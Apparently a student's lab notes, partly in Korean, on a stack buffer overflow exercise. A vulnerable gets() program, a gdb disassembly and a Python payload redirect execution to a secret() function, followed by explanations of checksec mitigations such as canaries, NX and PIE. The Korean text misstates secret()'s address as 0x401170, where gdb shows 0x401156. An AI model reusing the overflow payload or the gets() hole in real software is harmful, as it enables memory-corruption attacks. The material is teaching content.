challenge1  
```
void secret() {
    printf("secret function called!\n");
}

void vuln() {
    char buf[16];
    gets(buf);
}

int main() {
    vuln();
    return 0;
}
```
```
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x0000000000401170 <+0>:     endbr64
   0x0000000000401174 <+4>:     push   %rbp
   0x0000000000401175 <+5>:     mov    %rsp,%rbp
   0x0000000000401178 <+8>:     sub    $0x10,%rsp
   0x000000000040117c <+12>:    lea    -0x10(%rbp),%rax
   0x0000000000401180 <+16>:    mov    %rax,%rdi
   0x0000000000401183 <+19>:    mov    $0x0,%eax
   0x0000000000401188 <+24>:    call   0x401060 <gets@plt>
   0x000000000040118d <+29>:    nop
   0x000000000040118e <+30>:    leave
   0x000000000040118f <+31>:    ret
End of assembler dump.
```
-0x10(%rbp),%rax -> 16  
sfp -> 8  
16 + 8 = 24  
```
(gdb) p secret
$1 = {void ()} 0x401156 <secret>
```
```
(wsl) python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x56\x11\x40\x00\
x00\x00\x00\x00')" | ./vuln
secret function called!
Segmentation fault (core dumped)
```

challenge2  
```
(wsl) checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   37 Symbols        No    0      1./vuln
```
STACK CANARY:No canary found  
```
(wsl) gcc -o vuln_protected main.c
(wsl) checksec --file=./vuln_protected
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   40 Symbols        No    0      1./vuln_protected
```
STACK CANARY:Canary found  
버퍼 오버플로우가 발생하면 canary가 변조된것이 보여 컴퓨터가 명령어를 강제 종료한다  
```
확인 가능 정보:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
```
① RELRO (RELocation Read-Only)
개념: 프로그램이 실행될 때 메모리의 특정 동적 영역(GOT 등)을 '읽기 전용'으로 바꾸는 기술입니다.

상태 종류:

No RELRO: 보호 없음. 메모리 주소를 쉽게 조작할 수 있음.

Partial RELRO: 일부분만 보호함. 대중적인 기본 상태.

Full RELRO: 완전히 읽기 전용으로 만들어 함수 주소를 가로채는 공격을 완벽히 방어함.

② Stack (Stack Canary)
개념: 스택 메모리에서 버퍼(buf)와 리턴 주소(RET) 사이에 컴퓨터가 임의로 생성한 암호값(Canary, 카나리)을 숨겨두는 기술입니다.

상태 종류: Canary found / No canary found

원리: 함수가 종료될 때 이 암호값이 그대로인지 검사합니다. 만약 오버플로우로 인해 암호값이 조금이라도 바뀌었다면 공격이 들어왔다고 판단하여 프로그램을 즉시 종료합니다. 광산의 유독가스를 탐지하던 새(카나리아)에서 유래되었습니다.

③ NX (No-Execute) / DEP
개념: 메모리 영역 중에서 데이터가 저장되는 공간(스택, 힙 등)에서는 코드가 실행되지 않도록 막는 기술입니다.

상태 종류: NX enabled / NX disabled

원리: 과거에는 공격자가 스택에 직접 악성 코드(셸코드)를 적어두고 거기로 실행 흐름을 돌려 해킹하곤 했습니다. NX가 켜져 있으면 스택에 아무리 악성 코드를 적어도 실행 자체가 불가능하므로 안전합니다.

④ PIE (Position Independent Executable) / ASLR
개념: 프로그램이 실행될 때마다 메모리 주소를 완전히 무작위(랜덤)로 배치하는 기술입니다.

상태 종류: PIE enabled / No PIE

원리: Challenge 1에서는 -no-pie를 주어 secret() 함수의 주소가 항상 0x401170 등으로 고정되어 쉽게 공격할 수 있었습니다. 만약 PIE enabled 상태라면 프로그램을 켤 때마다 주소가 계속 바뀌기 때문에 고정된 주소로는 공격자가 타겟 함수를 찾을 수 없게 됩니다.

⑤ RPTH / RUNPATH (Runpath)
개념: 프로그램이 실행 중에 필요한 외부 라이브러리(.so 파일)를 어디서 가져올지 지정해 둔 경로 보안 설정입니다.

보안적 의미: 악의적인 경로에서 가짜 라이브러리를 불러와 실행하는 권한 상승 공격(LPE) 등을 방어하기 위해 검사합니다.
